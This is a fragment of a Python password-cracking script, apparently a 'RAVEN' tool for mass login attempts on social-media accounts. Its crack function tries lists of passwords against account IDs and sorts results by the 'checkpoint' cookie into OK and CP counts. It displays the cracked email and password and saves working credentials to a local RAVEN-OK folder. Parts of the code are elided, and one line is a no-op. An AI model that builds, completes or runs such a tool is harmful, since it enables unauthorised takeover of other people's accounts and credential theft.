...
def crack(idf,pwv):
    ...
    sys.stdout.write(f'\r \x1b[1;97m[ \x1b[1;97mRAVEN \x1b[1;37m] \x1b[1;37m(\x1b[1;92mOK\x1b[1;30m-\x1b[1;93mCP\x1b[1;37m) \x1b[1;37m(\x1b[1;32m{ok}\x1b[1;30m-\x1b[1;33m{cp}\x1b[1;37m)\x1b[1;30m =\x1b[1;37m {loop}  ')
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                ...
                table.add_row("Email ➜ \n—————————————————————————", idf+"\n—————————————————————————")
                table.add_row("Pass ➜ \n—————————————————————————", pw+"\n—————————————————————————")
                table.add_row("User-Agent ➜ \n—————————————————————————\nHello my friend Good Luck\nThis tool made by RAVEN 🎲\nMy User: @F_M_D on telegram", ua+"\n—————————————————————————")
                footer_text = Text("Dev: RAVEN | @F_M_D  ", style="blue")
                ...
                table.add_row("Pass ➜ \n—————————————————————————", pw+"\n—————————————————————————")
                table.add_row("User-Agent ➜ \n—————————————————————————\nHello my friend Good Luck\nThis tool made by RAVEN 🎲\nMy User: @F_M_D on telegram", ua+"\n—————————————————————————")
                footer_text = Text("Dev: RAVEN | @F_M_D  ", style="bold blue")
                ...
                open('/storage/emulated/0/RAVEN-OK/' + okc, 'a').write(idf + '|' + pw + '\n')
            else:
                ';'.join
        except requests.exceptions.ConnectionError:
            time.sleep(1)
